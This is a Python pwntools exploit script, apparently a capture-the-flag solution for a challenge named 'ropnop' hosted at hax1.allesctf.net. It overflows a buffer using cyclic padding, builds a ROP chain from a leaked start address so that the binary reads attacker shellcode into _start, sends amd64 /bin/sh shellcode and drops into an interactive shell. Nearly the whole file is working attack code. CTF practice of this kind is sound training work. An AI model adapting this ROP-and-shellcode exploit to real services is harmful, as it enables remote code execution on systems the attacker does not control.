#!/usr/bin/env python3
from pwn import *
from huepy import *
import sys
import os
import socket
import subprocess
import re

vuln_host = 'hax1.allesctf.net'#'127.0.0.1'
vuln_port = '9300'

app_path = os.getcwd()+'/ropnop'

lo = not 'remote' in sys.argv
dbg = 'dbg' in sys.argv or 'debug' in sys.argv

if dbg:
    log.setLevel(2)

break_main = 'break_main' in sys.argv
buffer_overflow = 'buffer_overflow' in sys.argv

context(os='linux', arch='amd64', bits=64, terminal=['tmux', 'splitw', '-h'])

def init_dbg(app_path):
    args = []
    if break_main and not buffer_overflow:
        args.append('set stop-on-solib-events 1')
        args.append('continue')
        args.append('continue')
        args.append('break __libc_start_main')
        args.append('commands')
        args.append('break *$rdi')
        args.append('continue')
        args.append('end')
        args.append('continue')
        args.append('delete')
    elif buffer_overflow:
        args.append('set context-sections ""')
        args.append('define hook-stop')
        args.append('printf "cyclic: %p\\n", *((int *)$rsp)')
        args.append('python __import__("time").sleep(10000)')
        args.append('end')
        args.append('continue')
    else:
        args.append('continue')
    return gdb.debug(app_path, "\n".join(args))


elf = ELF(app_path)
if lo:
    p = process(app_path) if not dbg else init_dbg(app_path)
else:
    p = remote(vuln_host,vuln_port)

# PWN
if buffer_overflow:
    p.sendline(cyclic(4096))

padding = cyclic_find(0x61616167)

rop = ROP(elf)
start_addr = int(p.readuntil(b"\n").split(b"start: ")[1].split(b" - ")[0],16)

rop.raw(start_addr+0x60) #rbp (junk)
rop.raw(start_addr+0x1351) #pop rsi, pop r15; ret
rop.raw(start_addr) #_start (read destination)
rop.raw(0)
rop.raw(start_addr+0x12ca) #read 0x1337 bytes (shellcode) in _start
[rop.raw(0) for _ in range(0x20//8)] #paading for add, rsp 0x20
rop.raw(0x41414141) #rbp
rop.raw(start_addr) #jump to _start (execute shellcode)

p.sendline(b"B"*(padding-0x8)+(rop.chain())) # -0x8 becuase of pop rbp

shellcode = asm(shellcraft.amd64.linux.sh())

p.sendline(shellcode)

p.interactive()